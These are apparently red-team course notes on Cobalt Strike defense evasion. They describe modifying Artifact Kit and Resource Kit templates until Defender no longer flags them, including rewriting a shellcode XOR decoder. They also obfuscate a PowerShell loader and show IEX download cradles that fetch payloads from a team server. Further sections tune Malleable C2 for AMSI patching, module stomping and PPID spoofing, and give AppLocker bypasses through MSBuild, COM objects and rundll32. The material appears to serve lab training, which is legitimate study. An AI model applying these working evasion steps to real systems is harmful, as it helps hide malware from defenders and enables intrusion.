_Defense Evasion_ is a tactic where adversaries attempt to avoid detection during their operation.  This is not something they do at just the start or end of an engagement, but should be incorporated throughout.

The goal of this chapter is to focus specifically on Beacon, its default indicators, and how operators can avoid getting easily tagged by anti-virus vendors.
## Artifact Kit
Artifact kit is used to modify the compiled templates.

Cobalt Strike contains a collection of stage0 templates that form the basis of the `.exe`, `.svc.exe`, and `.dll` payloads. CS is packaged with default templates names after purpose / arch.
	32 vs 64 bit
	big = stageless
	svc = service binary templates
	![[Pasted image 20260107191253.png]]

Payload artifacts are prime targets for AV
	These are static known signatures UNLESS modified by operator.

Artifact Kit:
	 Contains source code for these templates, allowing us to modify as needed.
		![[Pasted image 20260107191704.png]]
	`src-main`
		`main.c` and `dllmain.c` 
		entry points for `.exe` and `.dll` templates
	`src-common`
		multiple `bypass-*.c` files
		`patch.c`
			logic for shellcode injection
			`injector.c`
			`start_thread.c`

Testing Detections:
	Do NOT upload to VirusTotal: this burns your tooling...
	Use [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) (a fork of DefenderCheck) to see if AV can detect your custom payloads.
		Analyses binary and scans with Defender to identify smallest chucks detected as malicious

Remediating Bad Detections:
	If code is detected as bad, load into [Ghidra](https://github.com/NationalSecurityAgency/ghidra) 
	Modify bad shellcode
	Rebuild

How to build new template sets? -- `build.sh`
```powershell
## In WSL
# Syntax
./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>

# Example
attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact$ ./build.sh  # Run build.sh first without arguments to determine DEFAULT sizes
attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact$ ./build.sh mailslot VirtualAlloc 344564 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```
Options:
	techniques : space separated list of bypass templates you want to build
	allocator : which API is used to allocate memory for shellcode
	stage size : set space needed for beacon shellcode. 
		Leave default unless using custom reflective loader
	RDLL size : set 0 unless using custom reflective loader
	resource file : if set to true, `src-main/resource.rc` is used to define properties of artifact
		CompanyName, FileDescription, ProductName, etc...
	stack spoof : if set to true, enables stack spoofing technique to hide fact that shellcode is executing from unbacked region of memory
		ignore for this course
	syscalls : sets system call method
		ignore for this course
	output directory : directory to save generated artifacts

Testing Detections
```powershell
# Check artifacts and aggressor script
PS C:\Tools\cobaltstrike\custom-artifacts\mailslot> ls

# Check against ThreatCheck to see if Defender AV detects it
PS C:\Tools\cobaltstrike\custom-artifacts\mailslot> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\artifact64big.exe

# Example output -- end of bad bytes at offset 0x9CE
[+] Target file size: 413184 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x9CE
000008CE   00 00 48 83 EC 28 48 8B  05 65 33 06 00 C7 00 01   ..H.ì(H..e3..Ç..
000008DE   00 00 00 E8 AA FC FF FF  90 90 48 83 C4 28 C3 0F   ...èªüÿÿ..H.Ä(A.
000008EE   1F 00 48 83 EC 28 48 8B  05 45 33 06 00 C7 00 00   ..H.ì(H..E3..Ç..
000008FE   00 00 00 E8 8A FC FF FF  90 90 48 83 C4 28 C3 0F   ...è.üÿÿ..H.Ä(A.
0000090E   1F 00 48 83 EC 28 E8 B7  60 00 00 48 85 C0 0F 94   ..H.ì(è·`..H.A..
0000091E   C0 0F B6 C0 F7 D8 48 83  C4 28 C3 90 90 90 90 90   A.A÷OH.Ä(A.....
0000092E   90 90 48 8D 0D 09 00 00  00 E9 D4 FF FF FF 0F 1F   ..H......éOÿÿÿ..
0000093E   40 00 C3 90 90 90 90 90  90 90 90 90 90 90 90 90   @.A.............
0000094E   90 90 48 FF E1 48 63 05  D6 6A 00 00 85 C0 7E 26   ..HÿáHc.Öj...A~&
0000095E   83 3D CF 6A 00 00 00 7E  1D 48 8B 15 06 6D 06 00   .=Ij...~.H...m..
0000096E   48 89 14 01 48 8B 15 03  6D 06 00 48 63 05 B4 6A   H...H...m..Hc.'j
0000097E   00 00 48 89 14 01 C3 41  54 55 57 56 53 48 83 EC   ..H...AATUWVSH.ì
0000098E   40 41 B9 04 00 00 00 4C  63 E2 48 89 CF 4C 89 C5   @A1....LcâH.IL.Å
0000099E   31 C9 41 B8 00 30 00 00  4C 89 E2 4C 89 E6 FF 15   1ÉA,.0..L.âL.æÿ.
000009AE   22 6D 06 00 48 89 C3 31  C0 39 C6 7E 15 48 89 C2   "m..H.A1A9Æ~.H.A
000009BE   83 E2 07 8A 54 15 00 32  14 07 88 14 03 48 FF C0   .â..T..2.....HÿA
[*] Run time: 10.93s
```

Remediating Bad Detections:
	Launch Ghidra - `ghidraRun.bat`
		File > New Project
		Non-shared project, set project directory (anywhere), name project
		![[Pasted image 20260108140630.png]]
	Add artifact to project
		File > Import File
		Select `C:\path\to\detected\artifact`
		![[Pasted image 20260108140722.png]]
	Open artifact in CodeBrowser by double-clicking artifact
		Say yes to analyzing
		![[Pasted image 20260108140836.png]]
	Leave analyzers as default and Analyze.
	Jump to offending code ThreatCheck identified:
		Navigation > Go To
		enter `file([HEXCODE])` -- this is the bad byte offset identified earlier
		click OK
	Narrow down search
		look at specific byte sequence identified by ThreatCheck
		ie: `83 E2 07 8A 54 15 00 32 14 07 88 14 03 48 FF C0`
		![[Pasted image 20260108141215.png]]
		in this example, we can see this sequence is a for loop
	Go back to artifact SOURCE code and find where this exists
		example: `spawn` function in `patch.c`
		![[Pasted image 20260108141451.png]]
	Modify it
		changing variables is NOT sufficient - original names are not retained in release builds.
		example of chaning a for loop with a reverse while loop:
```c
/* keep old code increase we break something and need to roll back
for (int x = 0; x < length; x++) {
   *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8]; // 8 byte XoR
} */

/* decode the payload with the key */
int x = length;
while(x--) {
   *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

Final Steps:
```powershell
# Rerun build script
attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact$ ./build.sh mailslot VirtualAlloc 344564 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```
```powershell
# Retest with ThreatCheck
PS C:\Tools\cobaltstrike\custom-artifacts\mailslot> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\artifact64big.exe

[+] No threat found!
[*] Run time: 0.34s

# Hook new templates into CS
Cobalt Strike > Script Manager > Load
C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna

# Generate new payloads
Payloads > Windows Stageless Payload
```

This example only covered the regular executable but there is also the DLL and service executable payloads to consider.  Following the same methodology will allow you to bypass any detections that are related to the artifact's source code.

## Resource Kit
Resource kit is used to modify the script templates. Antimalware Scan Interface ([AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)) is the main concern with PowerShell because it can detect scripts running in memory.

Using the resource kit
```powershell
# WSL, Generate new set of resources without changing anything
attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource$ ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
	# only requires output directory

# Check output directory
PS C:\Tools\cobaltstrike\custom-resources> ls
```

NOTE: ThreatCheck can only identify one 'bad part' of a file at a time.  It's common to patch out one detection, run ThreatCheck again, and find that a completely different one has popped up.

#### template.x64.ps1
Used to generate 64-bit stageless PowerShell payloads for workflows such as `jump winrm64`

Modifying template.x64.ps1
```powershell
# Scanning default template with ThreatCheck AMSI engine
PS C:\Tools\cobaltstrike\custom-resources> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e amsi

[+] Target file size: 2364 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x85B
0000075B   28 66 75 6E 63 5F 67 65  74 5F 70 72 6F 63 5F 61   (func_get_proc_a
0000076B   64 64 72 65 73 73 20 6B  65 72 6E 65 6C 33 32 2E   ddress kernel32.
0000077B   64 6C 6C 20 56 69 72 74  75 61 6C 41 6C 6C 6F 63   dll VirtualAlloc
0000078B   29 2C 20 28 66 75 6E 63  5F 67 65 74 5F 64 65 6C   ), (func_get_del
0000079B   65 67 61 74 65 5F 74 79  70 65 20 40 28 5B 49 6E   egate_type @([In
000007AB   74 50 74 72 5D 2C 20 5B  55 49 6E 74 33 32 5D 2C   tPtr], [UInt32],
000007BB   20 5B 55 49 6E 74 33 32  5D 2C 20 5B 55 49 6E 74    [UInt32], [UInt
000007CB   33 32 5D 29 20 28 5B 49  6E 74 50 74 72 5D 29 29   32]) ([IntPtr]))
000007DB   29 0A 09 24 76 61 72 5F  62 75 66 66 65 72 20 3D   )..$var_buffer =
000007EB   20 24 76 61 72 5F 76 61  2E 49 6E 76 6F 6B 65 28    $var_va.Invoke(
000007FB   5B 49 6E 74 50 74 72 5D  3A 3A 5A 65 72 6F 2C 20   [IntPtr]::Zero,
0000080B   24 76 5F 63 6F 64 65 2E  4C 65 6E 67 74 68 2C 20   $v_code.Length,
0000081B   30 78 33 30 30 30 2C 20  30 78 34 30 29 0A 09 0A   0x3000, 0x40)...
0000082B   09 5B 53 79 73 74 65 6D  2E 52 75 6E 74 69 6D 65   .[System.Runtime
0000083B   2E 49 6E 74 65 72 6F 70  53 65 72 76 69 63 65 73   .InteropServices
0000084B   2E 4D 61 72 73 68 61 6C  5D 3A 3A 43 6F 70 79 28   .Marshal]::Copy(
[*] Run time: 0.93s

# Open in PowerShell ISE or VSCode (they are text so easier to analyze)

# Find offending portion
```
![[Pasted image 20260108144456.png]]
```powershell
# Remove and replace -- example: call to native WriteProcessMemory API instead
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

# Rerun ThreatCheck AMSI
PS C:\Tools\cobaltstrike\custom-resources> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e amsi
[+] No threat found!
[*] Run time: 0.19s

# Load resources.cna into CS client
```

#### compress.ps1
Used in places like when hosting a PowerShell payload via CS scripted Web Delivery attack
	Takes `template.[x64]/[x86].ps1` , GZIP compress, base64 encode, and patches into `compress.ps1`

compress.ps1
```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

Checking for Detection
```powershell
# ThreatCheck does not work on this. Finds no threats but downloading a payload using scripted web delivery will get detected.
PS C:\Users\Attacker> IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/a'))
	# This script contains malicious content and has been blocked by your antivirus software.

# Download Invoke-Obfuscation
PS C:\Users\Attacker> ipmo C:\Tools\Invoke-Obfuscation\Invoke-Obfuscation.psd1
PS C:\Users\Attacker> Invoke-Obfuscation
Invoke-Obfuscation>

# Set script block to compress.ps1
Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'

# Apply built-in obfuscations

# Example final product
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();

# Replace content of compress.ps1. 
# Load resources.cna into CS client

# Host and test new payload
PS C:\Users\Attacker> IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/a2'))
```
## Malleable C2
We can adjust certain profile setting in the Cobalt Strike profile. A lot of this is covered in Beacon Memory and Post-ex Fork and Run. I am including this here as a one-stop shop example of modifying the C2 profile.

See cheatsheet for a better? profile.

```powershell
# SSH into team server
ssh attacker@10.0.0.5

# Move to profiles directory
cd /opt/cobaltstrike/profiles

# Modify C2 profile
vim default.profile

# Modify the file

stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";  # use a different module if you like
   set copy_pe_header "false";
}

post-ex {
  set amsi_disable "true";
  set spawnto_x64 "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
  set obfuscate "true";
  set cleanup "true";

  transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";

      # add any other transforms that you want
  }
}

process-inject {
  execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      RtlCreateUserThread;
      CreateThread;
  }
}

# Save, then restart teamserver
sudo /usr/bin/docker restart cobaltstrike-cs-1
```

## Beacon Memory
There are some bits we can turn on for better evasion in Beacon.

Inspect memory allocations of beacons with [System Informer](https://systeminformer.com/)
	![[Pasted image 20260108151313.png]]

The following code block may be used and summarizes the next 3 sub-sections.

default.profile in Malleable C2
```
stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";  # use a different module if you like
   set copy_pe_header "false";
}
```
#### Module stomping
The Problem:
	When CS beacon starts up, it asks Windows for a fresh, empty block of memory via `VirtualAlloc`
	Anomalous and detected.

Solution - Module Stomping:
	Tell Windows to load a System32, sacficial DLL instead of using empty block of memory.
	Overwrite the file in memory with Beacon code.

Requirements:
	DLL must be larger than your Beacon code.
	Don't stomp a DLL a program actually uses.

How to enable?
	Use `stage.module_[x64/x86]` in Malleable C2 by specifying the filename of a DLL in System32
```
stage {
   set module_x64 "Hydrogen.dll";
}
```

Inspecting
	![[Pasted image 20260108152500.png]]
#### RWX memory
The Problem:
	By default, Beacon sets memory block to RWX
	EDR will see this and flag it.

Solution:
	Set `userwx "false"` in option in Malleable C2
	This changes the perms of the memory region.
		- RX for the .text section.
		- RW for the .data section.
		- R for the .rdata, .pdata, and .reloc sections.
```
stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";
}
```

Inspecting
	![[Pasted image 20260108153044.png]]
#### PE Headers
We can also instruct the reflective loader to copy Beacon into memory without its PE headers.
Removing them slightly reduces the detection surface of the Beacon.

```
stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";
   set copy_pe_header "false";
}
```

## Post-ex Fork and Run
Getting a Beacon running, either from an artifact on disk or in-memory, is only the first step. Post-ex commands can be detected by AV so we need to know how to mitigate this.

Most of these discussed are fork and run commands, which are most risky from OPSEC perspective.

Fork and Run workflow:
	![[Pasted image 20260108154330.png]]
#### CreateRemoteThread
This API has been used to kick off execution of remote process.

Can be detected in Kernel via [PsSetCreateThreadNotifyRoutine](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine) function.

Beacon can be configured to use other APIs in `process-inject.execute` block of Malleable C2.
	Some options to use
		`CreateThread
		`CreateRemoteThread
		`SetThreadContext
		`ObfSetThreadContext
		`NtQueueApcThread
		`NtQueueApcThread-s
		`RtlCreateUserThread

`process-inject.execute`
```
process-inject {
   execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      CreateThread;
   }
}
```

#### Named pipe names
The default named pipe name that Beacon uses with its post-ex DLLs is `postex_####`

The `post-ex.pipename` Malleable C2 option accepts a comma-separated list of alternate pipe names, where a random one is chosen each time.

OPSEC:
	Pick anything that looks convincing enough to blend in with normal named pipe names.

`post-ex.pipename`
```
post-ex {
   set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
}
```

#### Parent-Child relationships
We have to be aware of the parent process Beacon lives in and the child process that spawns. ie: msedge.exe spawning rundll32.exe is WEIRD.

Operators can change this spawn-to process at runtime, via the `spawnto` command
	ie: setting spawn-to to MS Edge to blend in to patten of new edge processes each tab
```powershell
beacon> spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
beacon> powerpick Start-Sleep -s 60
```

You can also change the default spawn-to process from rundll32 via the `post-ex.spawnto` option in Malleable C2.  For example:

`post-ex.spawnto`
```
post-ex {
   set spawnto_x86 "%windir%\\syswow64\\svchost.exe"; 
   set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
}
```


#### psexec spawnto
Beacon's `jump psexec[64]` command uses a service binary to run a Beacon payload but is dumb and does not understand variables that other CS binaries use. Because of that, we need to specify the spawnto host.

Using ak-settings
```powershell
# Setting spawnto
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\svchost.exe

# Verifying spawnto location
beacon> ak-settings
[*] artifact kit settings:
[*]    service     = ''
[*]    spawnto_x86 = 'C:\Windows\SysWOW64\svchost.exe'
[*]    spawnto_x64 = 'C:\Windows\System32\svchost.exe'

# Running psexec to jump
beacon> jump psexec64 lon-ws-1 smb
```
![[Pasted image 20260108161215.png]]

#### Image Load Events
Every hacking tool (like Mimikatz) needs specific Windows library files (DLLs) to function. Orgs might log these specific DLLs. To stay stealthy, we want to inject tools into process that USE those DLLs.

The problem? - Parent-child relationships:
	We want to ensure that parent-child processes make sense AND DLLs loaded make sense too.
	Might not be possible.
		ie: there's probably no process that legitimately loads System.Management.Automation.dll that is also found as a legitimate child of MS Edge. 

The Solution? - PPID Spoofing
	We spoof a relationship, allowing Beacon to spawn under an arbitrary parent, so the DLLs loaded make sense.

PPID Spoofing
```powershell
beacon> ps (or process_browser)   # Enumerate processes
beacon> ppid 6648                 # Spoofing explorer.exe
beacon> spawnto x64 C:\Windows\System32\msiexec.exe
beacon> powerpick Start-Sleep -s 60

beacon> ppid   # reset PPID to beacon
```

#### AMSI
Both PowerShell and .NET are instrumented by AMSI which means any post-ex PowerShell script or .NET assembly may be detected by an anti-virus.  You'll likely see this with popular tools such as PowerView and Rubeus.

The fix: 
	Modify CS Malleable C2 profile `amsi_disable`
	Instructs post-ex reflective loader used with `powerpick`, `psinject`, and `execute-assembly` commands to patch the AMSI DLL in-memory before executing the script / assembly.

OPSEC NOTE:
	`amsi_disable` DOES NOT apply to the `powershell` command - use `powerpick` or `psinject` instead.

`amsi_disable`
```
post-ex {
   set amsi_disable "true";
}
```

#### Post-ex DLL obfuscation
AV can still inspect post-ex capability post-injection via memory scans. These are usually triggered when a new thread is created in a remote process.

We can add a few options to Malleable C2 to help obfuscate post-ex DLL

The basics
```
post-ex {
   set obfuscate "true";
   set cleanup "true";
   set smartinject "true";
}
```
Explanations:
	`post-ex.obfuscate` is similar to the `stage.obfuscate` and `stage.userwx` options available for Beacon.
	`post-ex.cleanup` frees the post-ex reflective loader from memory after the post-ex DLL is loaded.
	`post-ex.smartinject` instructs Beacon to pass key function pointers to the post-ex DLL, which allows it to bootstrap itself without resolving them again.

Transform options
```
post-ex {
   ...

   transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
   }
}
```
Explanation:
	Allows you to replace strings in the post-ex DLLs.
	`strrepex` allows you to replace strings in a specific DLL.
	`strrep` allows you to replace strings in any/all post-ex DLLs.
	The valid post-ex names are:
		- ExecuteAssembly
		- Mimikatz
		- PowerPick
		- PortScanner
		- BrowserPivot
		- Hashdump
		- NetView
		- Keylogger
		- Screenshot
		- SSHAgent

Public resource like [Elastic's YARA repository](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar) is a great resource for finding candidates to change.
## AppLocker
AppLocker is an application control technology that is built into Windows.  Its aim is to prevent users from running applications, scripts, or packages that are not approved by policy.

A policy contains one or more enforcement rules
	Each rule contains a permission and a condition
		permission : allow or deny, and the user/group
		condition: defines the rule itself
			Based on - Publisher, Path, File Hash

Policies are defined by system administrators and typically deployed to computers via GPO or Intune, etc.  Windows provides a default set of AppLocker rules which look something like this:
	Executable Rules - `.exe` and `.com`
		Allow | Everyone | Path | %PROGRAMFILES%\*
		Allow | Everyone | Path | %WINDIR%\*
		Allow | BUILTIN\Administrators | Path | *
	Windows Installer Rules - `.msi`, `.msp` and `.mst`
	    Allow | Everyone | Publisher | *
	    Allow | Everyone | Path | %WINDIR%\Installer\*
	    Allow | BUILTIN\Administrators | Path | *.*
	Script Rules - `.ps1`, `.bat`, `.cmd`, `.vbs`, and `.js`
		Allow | Everyone | Path | %PROGRAMFILES%\*
		Allow | Everyone | Path | %WINDIR%\*
		Allow | BUILTIN\Administrators | Path | *
	Packaged App Rules - `.appx`
		Allow | Everyone | Publisher | *
#### Enumeration
AppLocker policies can be enumerated from two locations: directly from the GPO, or from the local registry of a computer to which they're applied.

```powershell
# Check if Constrained Language Mode is present
beacon> powershell $ExecutionContext.SessionState.LanguageMode
```
###### Registry
Useful in scenarios where you already have console access to a protected machine
```powershell
# Enumerate Hive
PS C:\Users\pchilds> Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'

# Enumerate Sub-keys of Hive
PS C:\Users\pchilds> Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\[Name]'

# ALTERNATIVE - use native AppLocker cmdlet
PS C:\Users\pchilds> $policy = Get-AppLockerPolicy -Effective
PS C:\Users\pchilds> $policy.RuleCollections
```

###### GPO
Useful in scenarios where you already have a Beacon running on an unprotected machine, but trying to move laterally to a protected machine.

Process:
	Enumerate all GPOs and go off of name
	or
	Walk through each container in SYSVOL and look for Registry.pol files in the Machine
```powershell
# Identify AppLocker Policy GUID
beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath

# Identify Registry.pol
beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{GUID}\Machine

# Download policy
beacon> download \\contoso.com\SysVol\contoso.com\Policies\{GUID}\Machine\Registry.pol

# Read file with Parse-PolFile cmdlet from GPRegistryPolicy module
PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol
```
#### Bypasses
Bypasses are dependent on policy itself, but some common ones to look for.
###### Path Wildcards:
custom rule might have overly permissive wild cards
`*\App-V\*` means an executable in any directory called App-V will be allowed to run.
```xml
<FilePathRule Id="daecf627-c762-4c7d-849a-7eb9d4e9692e" Name="App-V" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
	<Conditions>
		<FilePathCondition Path="*\App-V\*"/>  
	</Conditions>
</FilePathRule>
```
###### Writable Directories:
There are multiple directories that exist within default allowed path `%WINDIR%\*` that standard users can write to.
	Identify with `Get-Acl` and `icacls`
	Examples:
		C:\Windows\Tasks
		C:\Windows\Temp 
		C:\windows\tracing
		C:\Windows\System32\spool\PRINTERS
		C:\Windows\System32\spool\SERVERS
		C:\Windows\System32\spool\drivers\color
###### LOLBAS
Some [LOLBAS](https://lolbas-project.github.io/) can execute arbitrary code to bypass AppLocker if in whitelisted locations such as `%WINDIR%\*`

See [[An0nud4y CRTO Cheatsheet|00 CRTO - Cheatsheet]] in Applocker for guided steps on this part

Example - MSBuild running crafted .csproj file
```C#
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuild/>
  </Target>
   <UsingTask
    TaskName="MSBuild"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Reference Include="System.Windows.Forms" />		
      <Code Type="Class" Language="cs">
        <![CDATA[
		using Microsoft.Build.Utilities;
		using System.Windows.Forms;

		public class MSBuild : Task
		{
			public override bool Execute()
			{
				MessageBox.Show("Hello World", "AppLocker Bypass");
				return true;
			}
		}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```
![[Pasted image 20260108174954.png]]

###### PowerShell CLM
AppLocker will also change PowerShell's language mode from FullLanguage to ConstrainedLanguage. This restricts APIs we can use.

We can abuse by creating custom COM objects that will load DLL into PS process. Similar to COM hijacking.

```powershell
# Generate Guid
PS C:\Users\pchilds> [System.Guid]::NewGuid()

Guid
----
6136e053-47cb-4fdd-84b1-381bc5f3edb3

# Create malicious dll and save (See source code below)

# Create paths
C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID' -Name '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}' -Name 'InprocServer32' -Value 'C:\Users\pchilds\Desktop\bypass.dll'
C:\Users\pchilds> New-ItemProperty -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}\InprocServer32' -Name 'ThreadingModel' -Value 'Both'

C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'

# Use New-Object to Load COM object
PS C:\Users\pchilds> New-Object -ComObject AppLocker.Bypass
```
![[Pasted image 20260108175322.png]]

Source Code:
```C
#include <windows.h>
#include <stdio.h>

extern "C" __declspec(dllexport) BOOL execute() {
	MessageBox(NULL, L"Hello World", L"AppLocker Bypass", 0);
	return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		return execute();
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}
```
###### Rundll32
AppLocker can enforce DLL rules, but these are rarely enabled due to the performance concerns.

When disabled, you can load arbitrary DLLS using rundll32. 

Requirements:
	DLL must have one exported function that you call
	Beacon DLL works with this btw...

```
rundll32 bypass.dll,execute
```
![[Pasted image 20260108175554.png]]